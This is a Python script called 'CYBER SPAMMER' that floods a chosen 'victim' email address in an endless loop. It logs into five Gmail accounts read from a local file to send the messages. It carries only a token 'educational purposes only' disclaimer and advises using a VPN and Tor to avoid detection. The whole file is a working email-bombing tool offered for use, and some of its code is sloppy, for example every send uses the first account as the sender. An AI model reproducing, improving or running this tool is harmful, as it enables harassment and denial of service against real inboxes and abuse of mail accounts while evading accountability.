#######################################################
#                                                     #
#                                                     # 
#               CYBER SPAMMER                         #
#                            by cyber breacher        #                                    
#                                                     #
#                                                     #
#######################################################

# Code For Checking Connection

import requests
import os
from time import sleep
import colored

try:
   os.system("clear")
   print("Connecting.")
   sleep(1)
   r = requests.get("https://www.google.com")
   connect = r.status_code
   os.system("clear")
   if connect == 200:
         print("Connected.")
         sleep(1)
         os.system("clear")
except:
      os.system("clear")
      print(colored.attr("bold") + colored.fg(1) + "WTF! Check Your Internet Connection." + colored.fg(15) + colored.attr(0))
      sleep(2)
      exit()

# Code For Asking To Use The Program For Educational Purposes Only

disclaimer = "DISCLAIMER: our program is for EDUCATIONAL PURPOSES ONLY. Don't use this for illegal activities. You are the only responsable for your actions! To start the program acknowlegde my disclaimer by accepting, [yes & no]: "

print(colored.attr("bold")+colored.fg("10")+disclaimer+colored.fg(0)+colored.attr(0))

accept = input().upper()

if accept == "YES":
      print("Starting..")
      os.system("clear")
else:
      print("Exiting..")
      sleep(2)
      exit()

# Code For Collecting Info

import re
from Mail import mail


logo = open("assets/ASCII.txt","r")
logo_title = open("assets/ASCII2.txt","r")
logo_print = print(colored.fg(1) + logo.read() + colored.fg(15))
logo_title_print = print(colored.attr("bold") + colored.fg(10) + logo_title.read() + colored.fg(15) + colored.attr(0))

print("\nWelcome And Start Spamming. USE VPN AND TOR TO AVOID DETECTION.")

print("Give The Following Information Of Victim To Start.\n")
mail_data = [
   input("Name: "),   
   input("To: "),
   input("Subject: "),
   input("Message: ")
]

mail(mail_data[0], mail_data[1], mail_data[2], mail_data[3])

if re.match(r"[^@]+@[^@]+\.[^@]+", mail_data[1]):
      print(colored.attr("bold") + colored.fg(10) + "\nThe Address Is Valid. Starting Spamming" + colored.fg(15) + colored.attr(0))
else:
      print(colored.attr("bold") + colored.fg(1) + "\nWTF! Address Is Not Valid. Closing The Program." + colored.fg(15) + colored.attr(0))
      sleep(2)
      exit()

print("\nInitiating The Spamming...")

# Code For Spamming 

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

login = open("assets/assets.txt","r")
user_1 = login.readline()
pass_1 = login.readline()
user_2 = login.readline()
pass_2 = login.readline()
user_3 = login.readline()
pass_3 = login.readline()
user_4 = login.readline()
pass_4 = login.readline()
user_5 = login.readline()
pass_5 = login.readline()

loop = True

while loop == True:
      for sending in range(1):
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.ehlo()
            server.login(user_1, pass_1)
            message_format = MIMEMultipart()
            message_format['From'] = mail_data[0]
            message_format['To'] = mail_data[1]
            message_format['Subject'] = mail_data[2]
            message = mail_data[3]
            message_format.attach(MIMEText(message, 'plain'))
            text = message_format.as_string()
            server.sendmail(user_1,mail_data[1],text) 
            print(colored.attr("bold")+colored.fg(1)+"Sent.                          :)")    
      for sending in range(1):
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.ehlo()
            server.login(user_2, pass_2)
            message_format = MIMEMultipart()
            message_format['From'] = mail_data[0]
            message_format['To'] = mail_data[1]
            message_format['Subject'] = mail_data[2]
            message = mail_data[3]
            message_format.attach(MIMEText(message, 'plain'))
            text = message_format.as_string()
            server.sendmail(user_1,mail_data[1],text) 
            print("Sent.                          :)")
      for sending in range(1):
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.ehlo()
            server.login(user_3, pass_3)
            message_format = MIMEMultipart()
            message_format['From'] = mail_data[0]
            message_format['To'] = mail_data[1]
            message_format['Subject'] = mail_data[2]
            message = mail_data[3]
            message_format.attach(MIMEText(message, 'plain'))
            text = message_format.as_string()
            server.sendmail(user_1,mail_data[1],text) 
            print("Sent.                          :)")
      for sending in range(1):
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.ehlo()
            server.login(user_4, pass_4)
            message_format = MIMEMultipart()
            message_format['From'] = mail_data[0]
            message_format['To'] = mail_data[1]
            message_format['Subject'] = mail_data[2]
            message = mail_data[3]
            message_format.attach(MIMEText(message, 'plain'))
            text = message_format.as_string()
            server.sendmail(user_1,mail_data[1],text) 
            print("Sent.                          :)")
      for sending in range(1):
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.ehlo()
            server.login(user_5, pass_5)
            message_format = MIMEMultipart()
            message_format['From'] = mail_data[0]
            message_format['To'] = mail_data[1]
            message_format['Subject'] = mail_data[2]
            message = mail_data[3]
            message_format.attach(MIMEText(message, 'plain'))
            text = message_format.as_string()
            server.sendmail(user_1,mail_data[1],text) 
            print("Sent.                          :)")
            server.quit()
